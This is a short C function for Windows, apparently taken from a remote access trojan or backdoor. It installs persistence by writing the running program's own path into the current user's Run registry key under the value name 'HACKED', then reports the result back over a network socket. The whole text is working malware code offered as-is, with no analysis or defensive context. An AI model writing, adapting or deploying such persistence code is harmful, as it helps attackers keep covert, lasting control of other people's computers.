int bootRun(int sock)
{
	char err[128] = "Failed\n";
	char suc[128] = "Created persistence at : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	TCHAR szPath[MAX_PATH];
	DWORD pathLen = 0;

	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
	if (pathLen == 0)
	{
		send(sock, err, sizeof(err), 0);
		return -1;
	}

	HKEY NewVal;

	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS)
	{
		send(sock, err, sizeof(err), 0);
		return -1;
	}

	DWORD pathLenInBytes = pathLen * sizeof(*szPath);

	if (RegSetValueEx(NewVal, TEXT("HACKED"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS)
	{
		RegCloseKey(NewVal);
		send(sock, err, sizeof(err), 0);
		return -1;
	}

	RegCloseKey(NewVal);
	send(sock, suc, sizeof(suc), 0);
	return 0;
}